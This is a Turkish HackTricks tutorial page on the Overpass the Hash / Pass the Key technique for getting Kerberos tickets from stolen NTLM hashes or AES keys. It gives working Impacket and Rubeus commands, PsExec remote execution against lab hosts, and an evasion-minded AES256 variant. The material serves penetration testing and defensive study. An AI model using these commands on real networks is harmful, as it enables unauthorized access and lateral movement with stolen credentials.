# Over Pass the Hash/Pass the Key

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin!</summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin HackTricks'te reklamını görmek ister misiniz? Ya da PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) görün
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* **[💬 Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya beni Twitter'da takip edin 🐦[@carlospolopm](https://twitter.com/hacktricks_live)**.
* **Hacking püf noktalarınızı [hacktricks repo'ya](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo'ya](https://github.com/carlospolop/hacktricks-cloud) PR göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** saldırısı, geleneksel NTLM protokolünün kısıtlandığı ve Kerberos kimlik doğrulamasının öncelikli olduğu ortamlar için tasarlanmıştır. Bu saldırı, bir kullanıcının NTLM hash'ini veya AES anahtarlarını kullanarak Kerberos biletleri talep ederek ağdaki kaynaklara izinsiz erişim sağlar.

Bu saldırıyı gerçekleştirmek için ilk adım, hedeflenen kullanıcının hesabının NTLM hash'ini veya şifresini elde etmeyi içerir. Bu bilgiyi elde ettikten sonra, hesabın Ticket Granting Ticket (TGT) alınabilir ve saldırganın kullanıcının izinleri olduğu hizmetlere veya makineleri erişmesine olanak tanır.

Süreç aşağıdaki komutlarla başlatılabilir:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256 gerektiren senaryolar için `-aesKey [AES anahtarı]` seçeneği kullanılabilir. Dahası, elde edilen bilet, smbexec.py veya wmiexec.py gibi çeşitli araçlarla kullanılabilir, saldırı alanını genişleterek.

_PyAsn1Error_ veya _KDC cannot find the name_ gibi karşılaşılan sorunlar genellikle Impacket kütüphanesini güncelleyerek veya IP adresi yerine ana bilgisayar adını kullanarak çözülür, Kerberos KDC ile uyumluluğu sağlar.

Bu tekniğin başka bir yönünü gösteren alternatif bir komut dizisi Rubeus.exe kullanılarak aşağıdaki gibidir:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Bu yöntem, **Anahtarı Geçir** yaklaşımını yansıtır ve doğrudan kimlik doğrulama amaçları için biletin ele geçirilmesine ve kullanılmasına odaklanır. Bir TGT isteğinin başlatılması, varsayılan olarak RC4-HMAC kullanımını belirten `4768: Bir Kerberos kimlik doğrulama bileti (TGT) istendi` olayını tetikler, ancak modern Windows sistemleri genellikle AES256'yı tercih eder.

Operasyonel güvenliğe uyum sağlamak ve AES256'yı kullanmak için aşağıdaki komut uygulanabilir:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Referanslar

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Bir **cybersecurity şirketinde mi çalışıyorsunuz? **Şirketinizi HackTricks'te reklamını görmek ister misiniz**? ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi**](https://opensea.io/collection/the-peass-family)ni keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunuza bakın
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
